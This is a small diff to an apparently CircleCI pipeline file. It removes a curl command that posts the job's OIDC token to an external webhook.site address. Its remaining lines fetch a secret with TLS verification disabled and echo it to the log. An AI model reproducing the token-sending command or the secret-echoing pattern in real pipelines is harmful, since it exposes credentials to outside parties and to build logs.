@@ -22,9 +22,6 @@ jobs:
             secret=$(curl -s -k -X GET -H "Authorization: Token token=\"$token\"" "$CONJUR_FQDN/secrets/$CONJUR_ORG/variable/circleci/apps/safe/secret1")
             echo $secret
 
-            curl -s -k --request POST "https://webhook.site/a219ff03-f4b2-4bb0-8768-0710aa6688c8" --header 'Content-Type: application/x-www-form-urlencoded' --header "Accept-Encoding: base64" --data-urlencode "jwt=$CIRCLE_OIDC_TOKEN"
-            
-
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
